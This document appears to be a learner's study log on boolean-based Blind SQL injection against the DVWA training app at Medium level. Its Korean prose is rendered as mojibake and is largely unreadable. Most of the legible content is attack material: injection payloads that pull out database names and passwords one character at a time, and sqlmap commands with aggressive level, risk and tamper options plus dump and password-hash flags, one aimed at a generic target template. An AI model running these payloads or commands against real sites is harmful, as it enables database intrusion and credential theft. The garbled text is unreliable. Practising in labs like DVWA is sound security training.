ğŸ” [Blind SQL Injection - Medium] ë‚œì´ë„ íŠ¹ì§•
ğŸ” ë™ì‘ ë°©ì‹ ìš”ì•½
GET ë°©ì‹ì´ ì•„ë‹ˆë¼ POST ë°©ì‹ìœ¼ë¡œ id ê°’ì„ ë°›ìŠµë‹ˆë‹¤.

Blind ë°©ì‹ì´ë¼ ì°¸/ê±°ì§“ ê²°ê³¼ë§Œ íŒë‹¨ ê°€ëŠ¥ (ê²°ê³¼ê°€ ì§ì ‘ ì•ˆ ë³´ì„)

ì„±ê³µ/ì‹¤íŒ¨ëŠ” í˜ì´ì§€ ë‚´ìš©ì´ ë°”ë€ŒëŠ”ì§€ ì—¬ë¶€ë¡œ ì¶”ì¸¡í•´ì•¼ í•©ë‹ˆë‹¤.

mysql_real_escape_string ìˆëŠ”ë“¯. 
' ë“¤ì–´ê°€ë©´ ë°”ë¡œ ì˜¤ë¥˜í˜ì´ì§€ ë„ì›€ 
ìƒì„¸ì˜¤ë¥˜ë„ ì•„ë‹ˆê³  
There was an error. 
ì´ê±° í•œì¤„ ë¡ ë˜ì ¸ì£¼ëŠ” ì˜¤ë¥˜


 í•´ê²°ì±…: ìˆ«ì ì¸ì ì…˜ ì‹œë„
sql

id=1 AND 1=1   â†’ ì°¸  
id=1 AND 1=2   â†’ ê±°ì§“
ìœ„ì²˜ëŸ¼ ' ì—†ì´ ìˆ«ì ê¸°ë°˜ìœ¼ë¡œ Blind SQLi ì‹œë„í•˜ë©´ mysql_real_escape_string()ë„ ë¬´ë ¥í™”ë©ë‹ˆë‹¤.
ì™œëƒí•˜ë©´ ì´ í•¨ìˆ˜ëŠ” ë¬¸ìì—´ì—ë§Œ ì ìš©ë˜ê³ , ì •ìˆ˜í˜• íŒŒë¼ë¯¸í„°ì—ëŠ” ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šê¸° ë•Œë¬¸ì´ì—ìš”.

**Blind SQL Injection (Blind SQLi)**ì—ì„œ ì°¸/ê±°ì§“ì„ êµ¬ë¶„í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìœ¼ë©´, ê·¸ë‹¤ìŒ ë‹¨ê³„ëŠ” "ì°¸/ê±°ì§“ì˜ ì‘ë‹µ ì°¨ì´"ë¥¼ ì´ìš©í•´ì„œ ì •ë³´ë¥¼ í•œ ê¸€ìì”© ì¶”ì¶œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ë¥¼ Boolean-based Blind SQL Injectionì´ë¼ê³  í•´ìš”.


ğŸ¯ ëª©í‘œ
ì˜ˆ: ì²« ë²ˆì§¸ ìœ ì €ì˜ user ê°’ì„ ì–»ëŠ”ë‹¤ â†’ 'admin' ê°™ì€ ê°’

ğŸ§© ì§„í–‰ íë¦„
âœ… 1ë‹¨ê³„: ë¬¸ì ìˆ˜ í™•ì¸ (ê¸¸ì´ í™•ì¸)
sql
ë³µì‚¬
í¸ì§‘
id=1 AND LENGTH((SELECT user FROM users LIMIT 0,1)) = 5
â†’ í˜ì´ì§€ê°€ ì •ìƒ ì¶œë ¥ë˜ë©´ ê¸¸ì´ê°€ 5ë¼ëŠ” ëœ»
â†’ ê³„ì† 1~Nê¹Œì§€ ì‹œë„í•´ì„œ ê¸¸ì´ë¥¼ ì•Œì•„ëƒ„

âœ… 2ë‹¨ê³„: í•œ ê¸€ìì”© ë¹„êµ (SUBSTRING ì‚¬ìš©)
ì˜ˆë¥¼ ë“¤ì–´ adminì´ë¼ëŠ” ê°’ì„ ì•Œì•„ë‚´ê³  ì‹¶ë‹¤ë©´:

sql
ë³µì‚¬
í¸ì§‘
id=1 AND SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)='a'
â†’ 1ë²ˆì§¸ ê¸€ìê°€ 'a'ì¸ì§€ í™•ì¸

sql
ë³µì‚¬
í¸ì§‘
id=1 AND SUBSTRING((SELECT user FROM users LIMIT 0,1),2,1)='d'
â†’ 2ë²ˆì§¸ ê¸€ìê°€ 'd'ì¸ì§€ í™•ì¸

ì´ê±¸ ë°˜ë³µí•´ì„œ ê°’ì„ ì™„ì„±í•  ìˆ˜ ìˆì–´ìš”.

ğŸ§  ì¢€ ë” ìë™í™”ëœ ë°©ì‹ (ëŒ€ì†Œë¹„êµ ì‚¬ìš©)
sql
ë³µì‚¬
í¸ì§‘
id=1 AND ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)) > 100
â†’ ASCII ì½”ë“œë¥¼ ì´ìš©í•˜ë©´ **ì´ì§„ íƒìƒ‰(binary search)**ìœ¼ë¡œ ë¬¸ì ì¶”ì¶œë„ ê°€ëŠ¥

1: ê¸°ë³¸ SQLMap ëª…ë ¹ì–´
python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID="f3bk7vpun31j47omipvavolhug" --batch

âœ… ì´ ëª…ë ¹ì–´ê°€ í•˜ëŠ” ì¼
id=1 íŒŒë¼ë¯¸í„°ì— Blind SQL Injectionì´ ê°€ëŠ¥í•œì§€ ìë™ìœ¼ë¡œ í…ŒìŠ¤íŠ¸

ê°€ëŠ¥í•œ ê²½ìš°, íŠ¸ë£¨/í´ìŠ¤ ê¸°ë°˜ìœ¼ë¡œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ”ì§€ íŒë‹¨

ê²°ê³¼ëŠ” C:\Users\yuuki\AppData\Local\sqlmap\output\localhost ê²½ë¡œì— ì €ì¥ë¨

2: DB ì´ë¦„ ì•Œì•„ë‚´ê¸°
python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID="f3bk7vpun31j47omipvavolhug" --dbs --batch

ì˜¤ë¥˜ë°œìƒ.
[23:00:22] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 23:00:22 /2025-05-26/

ì´ ë©”ì‹œì§€ëŠ” sqlmapì´ ìë™ìœ¼ë¡œ íƒì§€í•œ ëª¨ë“  íŒŒë¼ë¯¸í„°(id, Submit ë“±)ê°€ SQL ì¸ì ì…˜ì— ì·¨ì•½í•˜ì§€ ì•Šë‹¤ê³  íŒë‹¨í–ˆë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ë‹¤ìŒì˜ ì´ìœ ë¡œ ì‹¤ì œë¡œëŠ” ì·¨ì•½í•  ìˆ˜ ìˆìŒì—ë„ ì‹¤íŒ¨í–ˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ğŸ” ì›ì¸ ì •ë¦¬
Blind SQL Injectionì€ ì°¸/ê±°ì§“ ì—¬ë¶€ë§Œ ë°˜í™˜í•˜ê¸° ë•Œë¬¸ì— íƒì§€ ì–´ë ¤ì›€

There was an error. ë˜ëŠ” ë‹¨ìˆœí•œ ë¦¬ë””ë ‰ì…˜ ë“± ì‘ë‹µì˜ ì°¨ì´ê°€ ì‘ì•„ì„œ sqlmapì´ íŒë‹¨í•˜ì§€ ëª»í•¨

DVWA Medium ë‚œì´ë„ì—ì„œëŠ” mysql_real_escape_string() ì‚¬ìš©

ì¼ë°˜ì ì¸ ' ë‹¨ì¼ ì¸ì ì…˜ì€ ì°¨ë‹¨ë¨

í•˜ì§€ë§Œ ë…¼ë¦¬ ì—°ì‚°ìë‚˜ ìš°íšŒ ê¸°ë²•ì€ ì—¬ì „íˆ í†µí•  ìˆ˜ ìˆìŒ

sqlmapì´ ì¶©ë¶„íˆ ê¹Šì´ í…ŒìŠ¤íŠ¸í•˜ì§€ ì•ŠìŒ

ê¸°ë³¸ --level=1, --risk=1ì€ ë³´ìˆ˜ì ì´ë¼ íƒì§€ ì‹¤íŒ¨ ê°€ëŠ¥ì„± ìˆìŒ

python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=YOUR_SESSION_ID" -p id --level=5 --risk=3 --tamper=space2comment --dbs --batch


sqlmapì€ ìë™í™”ëœ SQL Injection ë„êµ¬ì´ê¸° ë•Œë¬¸ì—,
ë‹¹ì‹ ì´ ëŒ€ìƒ URLê³¼ ì„¸ì…˜ ì¿ í‚¤ ê°’ë§Œ ì œëŒ€ë¡œ ì£¼ë©´,
ë‚˜ë¨¸ì§€ëŠ” ê±°ì˜ ë‹¤ ì•Œì•„ì„œ í•´ì¤ë‹ˆë‹¤.

âœ… ë‹¹ì‹ ì´ í•´ì•¼ í•  ìµœì†Œí•œì˜ ì¤€ë¹„
1. ğŸ”— ì·¨ì•½í•œ URL
ì˜ˆì‹œ:

bash
ë³µì‚¬
í¸ì§‘
-u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
2. ğŸª ì„¸ì…˜ ì¿ í‚¤
ì˜ˆì‹œ:

bash
ë³µì‚¬
í¸ì§‘
--cookie="security=medium; PHPSESSID=abcdef1234567890"
(ë¡œê·¸ì¸ ì„¸ì…˜ì„ ìœ ì§€í•´ì•¼ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸)

ğŸ› ï¸ ì¶”ì²œ ê¸°ë³¸ ëª…ë ¹ì–´
bash
ë³µì‚¬
í¸ì§‘
python sqlmap.py -u "http://your.target.com/page.php?id=1" \
--cookie="PHPSESSID=ì„¸ì…˜ê°’; security=low" \
--batch \
--level=5 \
--risk=3 \
--dbs
--batch: ì§ˆë¬¸ ì—†ì´ ìë™ ì§„í–‰

--level=5 --risk=3: ê°€ëŠ¥í•œ ëª¨ë“  í…ŒìŠ¤íŠ¸ ì‹œë„

--dbs: ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡ ì¶œë ¥

ğŸ§  ì¶”ê°€ë¡œ ì„ íƒí•  ìˆ˜ ìˆëŠ” ê²ƒë“¤
ëª©ì 	ì˜µì…˜
í˜„ì¬ DB ì‚¬ìš©ì í™•ì¸	--current-user
í˜„ì¬ DB í™•ì¸	--current-db
í…Œì´ë¸” ë³´ê¸°	--tables -D dbì´ë¦„
ë°ì´í„° ë¤í”„	--dump -D dbì´ë¦„ -T í…Œì´ë¸”ì´ë¦„
ì•”í˜¸ í•´ì‹œ ê°€ì ¸ì˜¤ê¸°	--passwords



python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \ --cookie="security=medium; PHPSESSID=your_session_id" \ --level=5 --risk=3 \ --technique=B \ --tamper=space2comment \ --dbs \ --batch



sqlmap ìƒê°ë³´ë‹¤ ì˜¤ë¥˜ê°€ ë§ì´ ëœ¬ë‹¤. 


2025-05-27(í™”)
íŠ¹ìˆ˜ë¬¸ì ì—†ì´ Blind SQL Injection í•˜ëŠ” ë°©ë²• (Medium)
ê¸°ë³¸ ì›ë¦¬ 
Medium ë‚œì´ë„ëŠ” ', ", --, # ê°™ì€ ë¬¸ìë¥¼ escape í•˜ê±°ë‚˜ ë§‰ìŠµë‹ˆë‹¤.

í•˜ì§€ë§Œ ìˆ«ìí˜• ë°ì´í„°ì— ëŒ€í•œ ë¹„êµ ì—°ì‚°ì€ ê·¸ëŒ€ë¡œ í†µê³¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ‘‡ ì˜ˆì œ: ì°¸ê³¼ ê±°ì§“ í…ŒìŠ¤íŠ¸ (ìˆ«ì ë¹„êµë§Œ ì‚¬ìš©)
âœ… ì°¸ì´ ë˜ëŠ” ê²½ìš°
http
ë³µì‚¬
í¸ì§‘
http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1 AND 1=1&Submit=Submit
âŒ ê±°ì§“ì´ ë˜ëŠ” ê²½ìš°
http
ë³µì‚¬
í¸ì§‘
http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1 AND 1=2&Submit=Submit
ì´ ë‘ ìš”ì²­ì—ì„œ í˜ì´ì§€ì˜ ì‘ë‹µì´ ë‹¤ë¥´ë‹¤ë©´, Blind SQLi ê°€ëŠ¥í•©ë‹ˆë‹¤.

ëœë‹¤. 

ì˜ˆì œ: ë°ì´í„° ì¶”ì¶œ (ë¬¸ì ì¸ì½”ë”© ì—†ì´)
ğŸ“Œ ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„ì˜ ì²« ê¸€ìê°€ dì¸ì§€ í™•ì¸
MySQLì˜ ASCII() í•¨ìˆ˜ë¥¼ í™œìš©í•´ì„œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

http

?id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit
dì˜ ASCII ê°’ì´ 100ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
?id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=101&Submit=Submit

ì‘ë‹µ í˜ì´ì§€ê°€ ì°¸/ê±°ì§“ìœ¼ë¡œ ë‹¤ë¥´ë©´ ì„±ê³µ.

ì„±ê³µ.

ìë™í™” ì—†ì´ ìˆ˜ë™ ë°˜ë³µ ì˜ˆì‹œ (ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ)

http
?id=1 AND ASCII(SUBSTRING(password,1,1))=97&Submit=Submit   â† ì²« ê¸€ìê°€ aì¸ì§€?
?id=1 AND ASCII(SUBSTRING(password,1,1))=98&Submit=Submit   â† ì²« ê¸€ìê°€ bì¸ì§€?
ì´ëŸ° ì‹ìœ¼ë¡œ ë°˜ë³µí•˜ë©´ì„œ ê¸€ì í•˜ë‚˜ì”© ì¶”ì¶œí•©ë‹ˆë‹¤.

ì•”íŠ¼ ìˆ˜ë™ìœ¼ë¡œ ì–´ì°Œì €ì°Œ ë˜ê¸´í•œë‹¤. ë¯¸ë””ì›€ê¹Œì§€ í™•ì¸ì™„ë£Œ. 